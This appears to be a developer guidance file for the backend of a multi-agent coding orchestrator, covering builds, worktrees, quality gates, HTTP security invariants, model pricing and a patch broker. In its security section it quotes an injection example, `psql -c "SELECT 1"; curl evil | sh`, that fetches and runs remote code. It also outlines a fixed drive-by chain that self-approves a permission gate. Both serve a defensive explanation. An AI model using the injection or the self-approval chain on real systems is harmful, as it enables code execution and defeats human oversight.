# Swarm core (backend)

The orchestrator, agent drivers, PM planning session, and MCP subprocess servers.
Dev runs via `tsx` directly on `src/` (`npm run dev`); production runs the compiled
`dist/` build (`npm run build` → `tsc`).

## Coding principles

- **Small, single-purpose functions.** One function does one thing; keep business logic separate from presentation/transport.
- **No flag arguments.** Never add a boolean parameter that switches what a function does — split it into two clearly-named functions instead.
- **Strict return types.** Annotate return types on exported functions; never return "value on success, `false`/`null` on failure" — model failure explicitly.
- **Prefer pure functions** for business logic so it is trivially testable; write the tests for the logic you add and run them.
- **Formatting is tooling, not prose.** 2-space indent (no tabs) via `~/.editorconfig`; always use curly braces, opening brace on the same line (1TBS).

## Build discipline — MCP subprocess servers (easy to miss)

Three MCP servers are spawned as **separate child processes**, and they do NOT all get
live source loading the way the main dev server does. Editing their `src/` files can
have **zero effect** until you rebuild — this has silently burned real debugging time
(a PM gate was "fixed" in source but never ran because the spawned subprocess loaded a
stale `dist/` build).

- `src/permission-proxy/mcp-server.ts` — **always** loaded from
  `dist/permission-proxy/mcp-server.js` (hard-coded `new URL('../../dist/...')` in
  `drivers/agent-sdk.ts`), in dev **and** prod. **You MUST `npm run build` after every
  edit to this file**, then restart, or the running agent uses old proxy code.

- `src/pm/mcp-server.ts` — in dev (tsx) loads from source directly, so a server restart
  is enough. A compiled/production run loads it from `dist/pm/mcp-server.js`, so rebuild
  before shipping.

- `src/agents/result-server/mcp-server.ts` — the `submit_result` tool that gives agent-sdk
  agents (coder/tester/security/reviewer/marketplace) guaranteed structured output. Dev-aware
  like the PM server: in dev (tsx) it loads from source directly, so a server restart is
  enough. A compiled/production run loads it from `dist/agents/result-server/mcp-server.js`,
  so rebuild before shipping.

Rule of thumb: **after editing anything under `src/permission-proxy/` or
`src/pm/mcp-server.ts`, run `npm run build` and restart.** Quick staleness check:

```sh
find src -name '*.ts' -newer dist/<path>.js
```

Empty output = the compiled file is current.

## Git worktree model — coders vs. fix coders (loop.ts)

Coder tasks mutate the repo, so the loop isolates them; everything in this model lives
in `loop.ts`.

- **Normal coders** run in their own `git worktree` on a `swarm/<task.id>` branch off
  `HEAD`, then merge back (`mergeWorktree`). This lets independent coders run in parallel
  without `git add -A` theft or `files_changed` contamination.
- **Remediation/fix coders** (`t_fix_*`, spawned by a blocked reviewer/security gate) do
  the **opposite**: they run **in-place on the working branch with no worktree and no
  merge-back**. They exist to repair a previous coder's *already-merged* work, so a fresh
  worktree branched off `HEAD` would just build a second copy of the same files and then
  fail to merge over the originals (`"local changes would be overwritten"`). Do **not**
  reintroduce a worktree for fix tasks.
- **Read-only agents** (tester/security/reviewer/scout) never get a worktree — they share
  the main tree and can't write.

Anything that mutates the main working tree must go through **`withMainTreeLock`**
(merges take it briefly; an in-place fix coder holds it for its whole edit+commit run) so
the two never overlap. Fix tasks have `depends_on: []` and can start immediately, so they
*can* race a parallel coder's merge — the lock is what makes that safe.

## Gates, scribe, and the Negotiator guardrail (the "enforced quality" layer)

The product's moat is quality the *system* guarantees, not quality an agent remembers.
Three pieces make that real — know they exist before touching the gate/finding machinery.

- **Deterministic `checks` gate** (`agents/checks.ts`). A non-LLM gate (typecheck +
  hardcoded-secret scan) added to the feature/greenfield task graph (`commands/new.ts`).
  It routes **straight through `dispatch`** — no driver, no LLM — and returns a
  `checks-finding` (schema in `finding.ts`, `negotiable:false`, blocks on `FAIL`). A FAIL
  spawns a fix-coder via the normal remediation path (`loop.ts` trigger handles
  `checks`/`FAIL` alongside reviewer/security `CHANGES_REQUESTED`). `scanSecrets` is pure
  and unit-tested — keep it high-precision (vendor patterns only); a blocking gate must not
  false-positive. Add new deterministic checks here, not as LLM agents.

- **Self-building memory / scribe** (`drivers/*.runScribe`, `loop.ts` `distillMemory`,
  `repo.ts` `read/writeProjectMemory`). On successful run completion the loop calls a
  read-only scribe that distils **durable, non-obvious** facts into the target repo's
  `CLAUDE.md` under the managed `## Swarm Learnings` section (idempotent, atomic, no-op on
  empty). It MERGES (returns the full body) and must not write a changelog of the run.
  Best-effort — never fail a finished run on it. api-key driver returns empty (no-op).

- **Docs scribe / living documentation** (`drivers/*.runDocsScribe`, `loop.ts`
  `updateLivingDocs`, `agents/living-docs.ts`). A SECOND post-run scribe that updates
  HUMAN-facing docs (README, docs/**) when a run changed externally observable
  behaviour — the delineation vs `## Swarm Learnings` is specified in `docs/MEMORY.md`;
  keep the two scribes' scopes separate. Unlike the learnings scribe it may Write/Edit,
  and the doc-only boundary is **code-enforced in the loop, not trusted to the prompt**:
  `git status --porcelain` is snapshotted before/after and any newly changed path that
  fails `isLivingDocPath` (markdown only; never CLAUDE.md/CONTEXT.md/AGENTS.md or
  `.swarm/`) is reverted before doc changes are committed. Don't weaken that revert
  path; extend `living-docs.ts` (pure, unit-tested) if the rules need to change.

- **PM intake memory** (`state/session-recall.ts`, `pm/live-context.ts`). Planning
  prompts are enriched with (a) episodic recall of prior `.swarm/sessions/` snapshots
  (pure scoring: goal/file token overlap, file hits ×2) and (b) a live service digest
  (Sentry/Linear/GitHub/Vercel/Datadog) gathered in the BACKGROUND and cached in
  `.swarm/live-context.md` with a 10-min TTL — both follow the repo-digest pattern:
  kicked only after the turn's PM call finishes so they never contend with it. Live
  context uses ONLY read-only connector tools already granted to a hired specialist,
  intersected with the curated `INTAKE_SOURCES` set — grants are the permission
  boundary; never widen the tool list inside the driver. Injected third-party content
  is data-not-instructions (C1) — the trust rule lives in both the gather prompt and
  PM_SYSTEM.

- **Negotiator guardrail** (`loop.ts` `firstNonNegotiable`). The Negotiator is fully wired
  (SPAWN_FIX/DOWNGRADE/ABORT on deadlock). The §2 promise — *it can never rule away a
  correctness/safety finding* — is **code-enforced**: a DOWNGRADE targeting a
  `negotiable:false` blocking finding is refused and the run stops for a human. `negotiable`
  is system-derived from the finding schema (`finding.ts`), never self-declared — don't add
  a way for an agent to set it.

## The HTTP boundary — load-bearing security invariants (`server/`)

The server binds `127.0.0.1`, but **"localhost" is not a boundary a browser respects**: a
page the user visits can reach it with `fetch`/`EventSource`, and DNS rebinding defeats
the bind address. An Aug-2026 review found a live drive-by chain (plant a roster entry →
execute it → read the permission `request_id` off the cross-origin SSE stream →
self-approve the gate). These are the invariants that closed it. Breaking any one
re-opens it, and none of them announce themselves when broken:

- **Every request passes `server/request-guard.ts` `checkRequest` first** (Origin + Host,
  403 otherwise), before any routing. Absent `Origin` is allowed (curl/scripts);
  foreign or `"null"` Origin is not.
- **Never add an `Access-Control-Allow-Origin` header.** The UI is same-origin in prod
  (served by this server) and in dev (the Vite proxy). There is no legitimate
  cross-origin caller, so any CORS header is a hole. There were 41 of them; there are
  now zero.
- **`/marketplace/roster` and `/run/execute` are schema-validated** in
  `server/validate.ts` — the roster grants tools, and task ids become branch, worktree,
  and diff-file names. Task ids are charset-bounded; graphs must be acyclic with no
  dangling deps.
- **A single request must never kill the orchestrator.** Malformed JSON → 400, oversized
  body → 413, handler throws are caught, and the static server `stat()`s for real files
  (a directory request used to `EISDIR`-crash a run mid-flight).

Two more invariants live in the permission proxy (`permission-proxy/`):

- **SQL auto-allow must PROVE then `execFile`.** `sql-guard.ts` only auto-runs a command
  it can prove is a lone DB invocation with no shell-active syntax, and runs it as an
  argv — never through a shell. The old code classified a substring and then ran the
  original string via `/bin/sh`, so `psql -c "SELECT 1"; curl evil | sh` auto-ran both.
- **Ask mode must never be wider than allow mode.** Allow mode enforces a grant's scope
  natively via `Write(glob)`/`Bash(pattern)`; ask mode routes through the proxy, so the
  scopes are passed in (`SWARM_WRITE_SCOPE`/`SWARM_BASH_SCOPE`) and enforced by
  `scope-guard.ts`. Out-of-scope requests are refused outright, never escalated to the
  human — the grant already answered them.

Still open before any non-localhost deployment: there is **no per-session request token**
(the origin guard is sufficient for localhost only), and `localStorage` holds planning
sessions and charters in plaintext. See `docs/THREATS.md` S3.

## The model ladder — get the ORDER right, it is load-bearing

Model choice is spread across several files, and they must agree. Three of them were
wrong at once (fixed 2026-07-30) and the errors compounded, so treat this as a unit.

**The ladder is ordered by price, cheapest → priciest. Price per million tokens
(input/output):**

| Model | ID | Price | Context |
|---|---|---|---|
| Haiku 4.5 | `claude-haiku-4-5-20251001` | $1/$5 | 200K |
| Sonnet 4.6 | `claude-sonnet-4-6` | $3/$15 | 1M |
| Sonnet 5 | `claude-sonnet-5` | $3/$15 | 1M |
| Opus 4.8 | `claude-opus-4-8` | $5/$25 | 1M |
| Fable 5 | `claude-fable-5` | $10/$50 | 1M |

**Fable is the MOST capable and the MOST expensive — ~2x Opus.** It is not a fast/cheap
tier. Every place that orders models must put it at the top. The bug that motivated this
section: `ui/src/data/models.ts` ranked it *below* sonnet, so `isUpgrade()` never fired
for it and the priciest model bypassed the upgrade-confirmation gate; meanwhile the PM
prompt told the PM to "save with fable/haiku", actively steering the most expensive model
onto the cheapest work. Two independent files pointing the same wrong way.

Places that encode model facts — change them together:

- `ui/src/data/models.ts` — `RANK` (drives the upgrade-confirmation gate), `MODEL_CHOICES`,
  `modelMeta` labels. **`sonnet-5` must be matched before the generic `sonnet`.**
- `ui/src/data/forecast.ts` — `MODEL_COST_WEIGHT`, price-true relative to sonnet=1.
- `core/src/pm/index.ts` — `normalizeModel` (same sonnet-5-before-sonnet ordering trap)
  and the MODEL PER TASK block in `PM_SYSTEM`.
- `core/src/pm/mcp-server.ts` — the `model` + `effort` descriptions in the task-graph schema.
- `core/src/agents/coder.ts` — `PRICING` (api-key driver cost metering).
- `core/src/loop.ts` — `CONTEXT_WINDOWS`. Current models are **1M**, not 200K; only
  Haiku 4.5 is 200K. Recording 200K for Opus/Sonnet made the dashboard's context-%
  readout over-report ~5x.
- `core/src/providers/catalog.ts` — `PROVIDER_MODELS`, the cross-provider source of truth
  (tier, capabilities, supported reasoning efforts, transports). The Anthropic rows here
  must agree with the ladder above, and it additionally covers the OpenAI models — see
  the providers section below.

## Reasoning effort (`agents/effort.ts`)

Per-task `effort` (low|medium|high|xhigh|max) rides alongside `model`. Two API rules are
enforced there, centrally, and unit-tested — do not re-implement them at call sites:

- **Haiku 4.5 does not support `effort` at all** and errors if sent it. `effortForModel`
  returns undefined for haiku so the field is omitted.
- **`xhigh` only exists on Opus 4.7+ / Sonnet 5 / Fable 5.** Requests for it on older
  models are clamped to `high`.

Unset/unrecognised effort → undefined → field omitted → model default. Keeping that path
untouched is what makes the feature safe to add without a live run.

## Providers, model policy, and task routes (multi-provider — added Aug 2026)

Swarm is **no longer Claude-only**. `src/providers/` is the boundary that keeps that
manageable; go through it rather than hard-coding a vendor anywhere else.

- **`catalog.ts` is the single source of model truth.** `ProviderId` is
  `'anthropic' | 'openai'`; `PROVIDER_MODELS` records each model's tier, capabilities,
  `supportedReasoningEfforts`, and execution transports. Reasoning-effort support is
  **per model, not per provider** (e.g. gpt-5.4 and gpt-5.6 differ, and `'none'` is a
  distinct supported value) — always ask the catalog, never assume.
- **`model-policy.ts` decides what may actually execute** (`providerCanExecuteModel`,
  `getProviderModelPolicy`/`setProviderModelPolicy`, exported as `getProviderSelection`);
  **`discovery.ts` probes** which provider CLIs are present. Availability and policy are
  separate questions — an installed CLI is not permission to use it.
- **Task routes are immutable and validated server-side.** A routed task carries
  `route.provider/model/reasoningEffort/rationale/fallback/requiresConfirmation/writeScope`,
  checked in `server/validate.ts` before dispatch. **A coder route must declare a
  non-empty `writeScope`**, and every glob must be a safe repo-relative path — that scope
  is the containment for what the patch broker will accept.

### The Codex patch broker — the safety boundary that must not be weakened

The Codex driver is **read-only by construction: Codex never writes to the tree.** It
returns a *proposal* (`base_revision`, `changed_paths`, unified `patch`), and
`drivers/codex-patch.ts` is the only thing that can turn one into a commit. Before
anything lands it rejects: a `base_revision` that is not the worktree head (stale
proposals), binary patches, `changed_paths` outside the route's `writeScope`, traversal
or `.git/` paths, and malformed patches (model-miscounted hunk line counts are recounted,
not trusted). Then it requires broker approval **exactly once**, applies **exactly once**
(replay throws), and commits inside the task worktree. `drivers/codex-patch.test.ts`
pins every one of those refusals — if you change this file, that suite is the spec.
